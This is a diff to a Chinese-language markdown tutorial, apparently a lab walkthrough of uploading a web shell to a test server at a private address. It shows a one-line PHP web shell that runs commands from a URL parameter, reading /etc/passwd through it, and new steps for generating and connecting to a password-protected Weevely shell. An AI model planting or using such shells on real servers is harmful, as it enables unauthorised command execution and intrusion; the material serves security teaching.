@@ -51,7 +51,6 @@
 
 ### 2. 上传WebShell
 - 首先在本地编写好WebShell并暂时命名为`123.php`
-
 	```php
 	<?php
 	system($_GET['cmd']);
@@ -69,3 +68,12 @@
 - `cmd`参数可以被当成指令正确执行(在Chrome中, 为方便查看输出结果可以使用*显示网页源代码*模式)
 	![](images/cmd=cat_etc_passwd.png)
 - 至此, `WebShell`上传成功
+
+## 三. 进阶操作
+### 1. 高级Webshell
+- 高级Webshell有很多, 这里使用`Kali`中的`Weevely`工具来生成与连接高级Webshell
+	- 首先是生成:`weevely generate P4ssw0rd ~/123.php.fk`
+		![](images/weevely_generate.png)
+	- 然后将之上传至服务器上. 此时若直接在浏览器中对其进行访问将得不到任何输出. `Weevely`生成的Webshell需要通过`Weevely`进行连接: `weevely http://192.168.56.102/admin/uploads/123.php.fk P4ssw0rd`
+		![](images/weevely_connect.png)
+	- 如图, 刚连接进去时终端提示符为`weevely>`,此时敲击回车执行空命令即可得到`www-data@debian:/var/www/admin/uploads$`的终端提示符
